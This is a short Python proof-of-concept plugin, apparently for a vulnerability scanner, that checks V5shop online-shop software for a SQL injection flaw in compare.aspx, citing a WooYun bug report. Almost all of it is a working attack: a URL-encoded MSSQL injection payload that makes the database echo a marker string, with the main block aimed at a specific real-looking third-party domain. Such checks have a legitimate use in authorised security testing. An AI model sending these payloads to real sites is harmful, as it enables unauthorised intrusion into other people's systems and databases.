#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  V5shop网店建设系统存在一处SQL注入
From : http://www.wooyun.org/bugs/wooyun-2015-0101820
"""
def assign(service, arg):
    if service == "v5shop":
        return True, arg

def audit(arg):
    url = arg
    payload = "compare.aspx?ids=(SELECT%20CHAR(113)%2bCHAR(107)%2bCHAR(120)%2bCHAR(122)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(1566=1566)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2bCHAR(113)%2bCHAR(113)%2bCHAR(112)%2bCHAR(98)%2bCHAR(113))"
    target_url = url + payload 
    code,head,res,errcode,finalurl=curl.curl2(target_url)
    if code == 200 and "qkxzq1qqpbq" in res:
        security_hole(target_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('v5shop', 'http://shop.cacs.net.cn/')[1])